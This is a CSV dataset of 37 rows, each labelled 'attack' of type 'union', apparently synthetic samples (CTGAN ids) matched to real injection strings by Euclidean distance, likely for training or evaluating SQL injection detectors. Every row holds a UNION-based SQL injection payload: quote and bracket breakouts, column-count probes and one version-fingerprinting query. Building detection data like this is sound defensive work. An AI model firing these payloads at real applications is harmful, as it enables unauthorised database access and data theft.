id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000774,5.430048508032496
CTGAN_000002,attack,union,"1   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000770,5.4696394609205585
CTGAN_000003,attack,union,"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",nearest_attack_euclidean,R000695,4.3305294557197165
CTGAN_000004,attack,union,"-3725'   )    )    union all select 1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000582,5.683720408487352
CTGAN_000005,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000824,5.341068813670721
CTGAN_000006,attack,union,"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000870,5.803572197194333
CTGAN_000007,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001284,4.391481349741327
CTGAN_000008,attack,union,"-3361   )    )    union all select 2827,2827,2827,2827#",nearest_attack_euclidean,R000246,4.796907412898169
CTGAN_000009,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R001257,4.542821396183832
CTGAN_000010,attack,union,"-4413%'   )    )    union all select 1345,1345#",nearest_attack_euclidean,R001438,5.593405257067992
CTGAN_000011,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,4.577661708779728
CTGAN_000012,attack,union,"1' where 7445  =  7445 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001534,4.483954388835696
CTGAN_000013,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000785,4.389992538836308
CTGAN_000014,attack,union,"1'  )   where 5276  =  5276 union all select null,null--",nearest_attack_euclidean,R001349,4.615738646926567
CTGAN_000015,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000327,7.271141124788303
CTGAN_000016,attack,union,"1'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000965,4.903011515248445
CTGAN_000017,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000996,4.506894441499478
CTGAN_000018,attack,union,"-4068'   )    )     )   union all select 9491,9491,9491--",nearest_attack_euclidean,R000828,7.788893316453781
CTGAN_000019,attack,union,"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",nearest_attack_euclidean,R000570,4.0998978030978455
CTGAN_000020,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R001109,4.801809813332166
CTGAN_000021,attack,union,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",nearest_attack_euclidean,R001437,4.356628307866595
CTGAN_000022,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R001422,6.4004584708187675
CTGAN_000023,attack,union,-8809'||  (  select 'hyzr' where 5694  =  5694 union all select 5694--,nearest_attack_euclidean,R001526,8.106903993883245
CTGAN_000024,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000884,4.266295821747054
CTGAN_000025,attack,union,1'||  (  select 'owzs' where 1475  =  1475 union all select null--,nearest_attack_euclidean,R001540,8.562388379134138
CTGAN_000026,attack,union,"1'  )   as yjdg where 5262  =  5262 union all select null,null,null#",nearest_attack_euclidean,R001161,4.300299604652436
CTGAN_000027,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R001164,4.368218503108678
CTGAN_000028,attack,union,"1 where 2292  =  2292 union all select null,null,null,null#",nearest_attack_euclidean,R000951,5.467590738706124
CTGAN_000029,attack,union,"-9337  )   union all select 5648,5648,5648,5648,5648#",nearest_attack_euclidean,R000479,7.9267302292007225
CTGAN_000030,attack,union,"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001477,6.73235851957015
CTGAN_000031,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000322,4.045244597695856
CTGAN_000032,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R001409,4.212448473545541
CTGAN_000033,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000692,5.866500293231327
CTGAN_000034,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000422,5.74882246869816
CTGAN_000035,attack,union,union all select @@version--,nearest_attack_euclidean,R000128,7.13384249005882
CTGAN_000036,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001120,5.988280300391586
CTGAN_000037,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001105,4.361483904385217
